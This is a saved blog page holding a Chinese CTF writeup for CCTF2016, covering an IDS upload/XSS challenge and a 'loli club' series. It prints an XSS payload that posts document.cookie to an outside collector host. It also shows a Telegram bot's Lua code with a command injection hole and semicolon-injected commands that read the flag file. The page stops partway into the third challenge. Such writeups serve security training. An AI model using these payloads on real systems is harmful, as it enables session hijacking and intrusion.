@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+
+<html lang="zh-Hans">
+<head>
+<!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+<meta charset="utf-8"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<meta content="telephone=no" name="format-detection">
+<meta content="LoRexxar" name="author"/>
+<meta content="前两天打了0xFA举办的cctf，很幸运拿到了不错的名次稍微整理下wp" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="CCTF2016_writeup" property="og:title"/>
+<meta content="http://lorexxar.cn/2016/04/25/cctf2016/index.html" property="og:url"/>
+<meta content="LoRexxar's Blog" property="og:site_name"/>
+<meta content="前两天打了0xFA举办的cctf，很幸运拿到了不错的名次稍微整理下wp" property="og:description"/>
+<meta content="http://lorexxar.cn/img/cctf2016/1.png" property="og:image"/>
+<meta content="http://c-chicken.cc/ctf/2016/04/25/IDS-Writeup.html" property="og:image"/>
+<meta content="http://lorexxar.cn/img/cctf2016/re3.jpg" property="og:image"/>
+<meta content="http://lorexxar.cn/img/cctf2016/pwn31.png" property="og:image"/>
+<meta content="http://lorexxar.cn/img/cctf2016/pwn32.png" property="og:image"/>
+<meta content="2016-04-26T06:06:52.000Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="CCTF2016_writeup" name="twitter:title"/>
+<meta content="前两天打了0xFA举办的cctf，很幸运拿到了不错的名次稍微整理下wp" name="twitter:description"/>
+<meta content="http://lorexxar.cn/img/cctf2016/1.png" name="twitter:image"/>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
+<script src="./CCTF2016_writeup  LoRexxar's Blog/pace.min.js"></script>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/style.css" rel="stylesheet"/>
+<link href="./CCTF2016_writeup  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
+<title>CCTF2016_writeup | LoRexxar's Blog</title>
+<script src="./CCTF2016_writeup  LoRexxar's Blog/jquery.min.js"></script>
+<script src="./CCTF2016_writeup  LoRexxar's Blog/clipboard.min.js"></script>
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: false,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+<script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+<script> yiliaConfig.rootUrl = "\/";</script>
+<script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</meta></meta></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./CCTF2016_writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<form id="search-form">
+<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
+<i class="fa fa-times" onclick="resetSearch()"></i>
+</form>
+<div id="local-search-result"></div>
+<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
+<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
+<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
+<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
+<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
+<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
+<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
+<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
+<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
+<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
+<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
+<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
+<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
+<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./CCTF2016_writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
+</ul>
+</nav>
+</header>
+</div>
+<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
+</link></nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-cctf2016" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/04/25/cctf2016/">
+<time datetime="2016-04-25T04:20:27.000Z" itemprop="datePublished">2016-04-25</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      CCTF2016_writeup
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<p>前两天打了0xFA举办的cctf，很幸运拿到了不错的名次<br/><img alt="" src="./CCTF2016_writeup  LoRexxar's Blog/1.png"/><br/>稍微整理下wp</p>
+<a id="more"></a>
+<h1 id="pentest"><a class="headerlink" href="#pentest" title="pentest"></a>pentest</h1><h2 id="IDS-Chicken"><a class="headerlink" href="#IDS-Chicken" title="IDS-Chicken"></a>IDS-Chicken</h2><p>由于比赛的时候没做出来，结果看了wp发现就差一点点儿…<br/><img alt="http://c-chicken.cc/ctf/2016/04/25/IDS-Writeup.html" src="http://c-chicken.cc/ctf/2016/04/25/IDS-Writeup.html"/></p>
+<p>首先打开发现是个ids，如果检测到mysql报错，就会记录到后台。<br/>开始尝试注入，但是发现由于过滤了select，所以并没有什么卵用，注不到有用的东西，后来给了hint，发现其实不是开始想的注入题目。<br/><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//ids.c-chicken.cc/upload/</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//ids.c-chicken.cc/upload.php</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//ids.c-chicken.cc/conn.php</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//ids.c-chicken.cc/index.php</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//ids.c-chicken.cc/cgi-bin/</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//ids.c-chicken.cc/cgi-bin/printenv.cgi</span></div></pre></td></tr></table></figure></p>
+<p>…至于最后的东西，反正我是没扫到….<br/>不过怎么说还是找到了upload.php</p>
+<p>稍微测试了下发现传什么都没用，只有图片可以过，但是图片还被改名重写过…</p>
+<p>又给了提示：<br/>1、可以上传多媒体文件<br/>2、后台会记录攻击</p>
+<p>那么思路一下子清晰了很多，猜测上传swf文件，如果不被处理，那么就可以过CSP，那么就可以x到想要的东西了。<br/>测试发现头必须有，但是如果构造一个js文件，前面的头会爆错，<code>CWS未定义</code>然后就会停止（当时没想到解决办法，后来看出题人的思路告诉我们要定义一个id，这样就不会报错Orz）,我使用了`<link/>``<br/>在文件中写入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CWS</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest(); xml.open(<span class="string">'POST'</span>, <span class="string">'http://xss.xxxxx.cc'</span>, <span class="literal">true</span>); xml.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>); xml.send(<span class="string">'cookie='</span>+<span class="built_in">document</span>.cookie); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>然后<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'import'</span> <span class="attr">href</span>=<span class="string">'/upload/xxxxx'</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这样传入，就会接收到请求了</p>
+<p>可是没想到的是，测试的时候，由于不知道后台的记录方式是什么样的，猜测是不能报错或者要被fuck。。。那么我就使用了<br/><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">id</span>=<span class="number">1</span>'<span class="comment">#&lt;link xxxxxx&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这样的请求，还发了加select的，后来出题人告诉我#会把后面的截断，被fuck不会被记录…..</p>
+<p>表示心很累。。。。</p>
+<h2 id="萝莉俱乐部系列"><a class="headerlink" href="#萝莉俱乐部系列" title="萝莉俱乐部系列"></a>萝莉俱乐部系列</h2><h3 id="萝莉2"><a class="headerlink" href="#萝莉2" title="萝莉2"></a>萝莉2</h3><p>目标 ：<a href="http://www.loli.club/" rel="external" target="_blank">http://www.loli.club/</a><br/>拿到 Web 目录下的 flag 文件</p>
+<p>RR 说常规渗透过程, 页面源码给了</p>
+<blockquote>
+<p>powered by PockyNya<br/>诚招前端，请联系邮箱：pocky@loli.club<br/>直接丢谷歌找到github上有pockynya的信息</p>
+</blockquote>
+<p><a href="https://github.com/PockyNya/pyprint" rel="external" target="_blank">https://github.com/PockyNya/pyprint</a></p>
+<p>这一份代码是部署在</p>
+<p><a href="http://pocky.loli.club:41293/" rel="external" target="_blank">http://pocky.loli.club:41293/</a> </p>
+<p>pocky.loli.club (120.27.155.112) 杭州阿里云<br/>www.loli.club (47.89.50.241) 香港阿里云</p>
+<p>然后奇怪QAQ，后来说解题顺序和题目顺序无关。<br/>线程切到pocky.loli.club（loli2）</p>
+<p>翻翻看发现博客里面的文章<br/><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">最近黑阔盛行，我冥冥之中感觉到最近我的 <span class="keyword">Blog </span>会被一群黑阔访问。</div><div class="line">目前我做了如下解决方案：</div><div class="line">密码改变，不要是 username123 这种简单的密码，加上了特殊字符</div><div class="line">最近 Email 只点击我熟知的地址，比如我博客..<span class="number">2333</span></div><div class="line">博客由于是一个著名黑阔用 Python 写的，我相信肯定没有各种漏洞啦</div><div class="line">服务器是阿里云，阿里云一定很安全的说ww</div><div class="line">好像有个奇怪格式的邮件添加在我 Github 的 Personal settings 的 Emails 里面了..啊，不管了..应该没什么大碍吧..</div></pre></td></tr></table></figure></p>
+<p>上面基本上说的很清楚了，说明不是弱口令，也不是getshell题目，而且email只点击博客的地址，那么很清楚了，应该是xss</p>
+<p>然后此时发现在 post 多了些奇奇怪怪的文章。<br/>发表文章部份<br/><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddPostHandler</span><span class="params">(BaseHandler)</span>:</span></div><div class="line"><span class="meta">   @tornado.web.authenticated</span></div><div class="line">   <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></div><div class="line">       self.background_render(<span class="string">'add_post.html'</span>, post=<span class="keyword">None</span>)</div><div class="line"></div><div class="line">   <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></div><div class="line">       title = self.get_argument(<span class="string">'title'</span>, <span class="keyword">None</span>)</div><div class="line">       content = self.get_argument(<span class="string">'content'</span>, <span class="keyword">None</span>)</div><div class="line">       tags = self.get_argument(<span class="string">'tags'</span>, <span class="string">''</span>).strip().split(<span class="string">','</span>)</div><div class="line">       <span class="keyword">if</span> <span class="keyword">not</span> title <span class="keyword">or</span> <span class="keyword">not</span> content:</div><div class="line">           <span class="keyword">return</span> self.redirect(<span class="string">'/kamisama/posts/add'</span>)</div><div class="line"></div><div class="line">       post = self.orm.query(Post.title).filter(Post.title == title).all()</div><div class="line">       <span class="keyword">if</span> post:</div><div class="line">           <span class="keyword">return</span> self.write(<span class="string">'&lt;script&gt;alert("Title has already existed");window.history.go(-1);&lt;/script&gt;'</span>)</div><div class="line">       self.orm.add(Post(title=title, content=content, created_time=date.today()))</div><div class="line">       self.orm.commit()</div><div class="line">       <span class="keyword">return</span> self.redirect(<span class="string">'/kamisama/posts'</span>)</div></pre></td></tr></table></figure></p>
+<p>发现在添加文章的地方，并没有做用户的验证。<br/>猜想XSS一篇文章到邮箱让PockyNya戳。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = “http:<span class="comment">//pocky.loli.club/kamisama/posts/add”</span></div><div class="line"><span class="keyword">data</span> = {<span class="string">"title"</span>:<span class="string">"this is dong"</span>, <span class="string">"content"</span>: <span class="string">"this is dong"</span>}</div><div class="line">requests.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</div></pre></td></tr></table></figure>
+<p>这里真的是踩了很大的坑，第一次x到的cookie只有<br/><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=<span class="number">2</span>|<span class="type">1</span>:<span class="number">0</span>|<span class="type">10</span>:<span class="number">1461382264</span>|<span class="type">8</span>:username|<span class="type">12</span>:cG9ja3lueWE=|<span class="type">d4e540d298981e80bd48150453751ef3db7a18611d2748f0f1d8cee4484d4958</span></div></pre></td></tr></table></figure></p>
+<p>然后我们进了后台，虽然找到了loli1的入口，但是想不通为什么没有找到flag（说：是谁管这个的），花了3个小时研究觉得不可能有问题，所以又x了一次，这次拿到了flag</p>
+<p><code>flag=343334333534343637623433346634343435356634313535343434393534356634323535353335343435353235333764;</code></p>
+<p>x回来的flag。<br/><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;</span>&gt; s = <span class="string">''</span><span class="string">'343334333534343637623433346634343435356634313535343434393534356634323535353335343435353235333764'</span><span class="string">''</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; len(s)</div><div class="line"><span class="number">96</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import binascii</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; binascii.unhexlify(s)</div><div class="line"><span class="string">'434354467b434f44455f41554449545f425553544552537d'</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; len(binascii.unhexlify(s))</div><div class="line"><span class="number">48</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; s = binascii.unhexlify(s)</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; binascii.unhexlify(s)</div><div class="line"><span class="string">'CCTF{CODE_AUDIT_BUSTERS}'</span></div><div class="line"><span class="meta">&gt;&gt;</span>&gt;</div></pre></td></tr></table></figure></p>
+<p>第一只萝莉捕获成功。</p>
+<p>x回来的cookie登陆后台看到后台文章</p>
+<h3 id="萝莉1"><a class="headerlink" href="#萝莉1" title="萝莉1"></a>萝莉1</h3><blockquote>
+<p>在公司搭建了个 Minecraft 服务器来着… 用的官网的服务器，性能高~ 写了个 telegram bot 来管理 Minecraft 的开启和关闭，几行 lua 简单的很呢~ 代码如下：<br/><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span></div><div class="line"></div><div class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(msg, matches)</span></span></div><div class="line">  <span class="keyword">if</span> matches[<span class="number">1</span>] ~= <span class="string">'!minecraft'</span> <span class="keyword">then</span></div><div class="line">    operation = matches[<span class="number">1</span>]</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"!minecraft start|stop|restart"</span></div><div class="line">  <span class="keyword">end</span></div><div class="line">  <span class="keyword">if</span> <span class="built_in">string</span>.find(operation, <span class="string">'&amp;'</span>) <span class="keyword">or</span> <span class="built_in">string</span>.find(operation, <span class="string">'|'</span>) <span class="keyword">or</span> <span class="built_in">string</span>.find(operation, <span class="string">'`'</span>) <span class="keyword">then</span></div><div class="line"><span class="keyword">return</span> <span class="string">"Invalid operation "</span> .. operation</div><div class="line">  <span class="keyword">end</span></div><div class="line">  <span class="keyword">local</span> t = <span class="built_in">io</span>.popen(<span class="string">'cd /home/telegram &amp;&amp; ./mc '</span> .. operation)</div><div class="line">  <span class="keyword">local</span> a = t:read(<span class="string">"*all"</span>)</div><div class="line">  <span class="keyword">return</span> a</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> {</div><div class="line">  description = <span class="string">"loli.club minecraft bot!"</span>,</div><div class="line">  usage = <span class="string">"!minecraft start|stop|restart"</span>,</div><div class="line">  patterns = {</div><div class="line">    <span class="string">"^!minecraft$"</span>,</div><div class="line">    <span class="string">"^!minecraft (.*)$"</span></div><div class="line">  },</div><div class="line">  run = run</div><div class="line">}</div><div class="line"></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+</blockquote>
+<p>telegram上搜一下PockyNya(最扯的是telegram上有个叫pockybot的账户…)，肯定是头像最萌的那个。</p>
+<p>!minecraft ;ls /home/wwwroot<br/>!minecraft ;cat /home/wwwroot/flag</p>
+<p>CCTF{TELEGRAM_BOT_AND_Lf}</p>
+<p>RR 说bot拿完flag就没用了，所以没有继续玩♂, 嗯这个文件叫flag</p>
+<h3 id="萝莉3"><a class="headerlink" href="#萝莉3" title="萝莉3"></a>萝莉3</h3><p>内网渗透</p>
+<blockquote>
+<p>扫域名不是爆破我ns服务器..而且ns服务器是pockynya用python和mysql开发的，会有什么漏洞呢..</p>
+</blockquote>
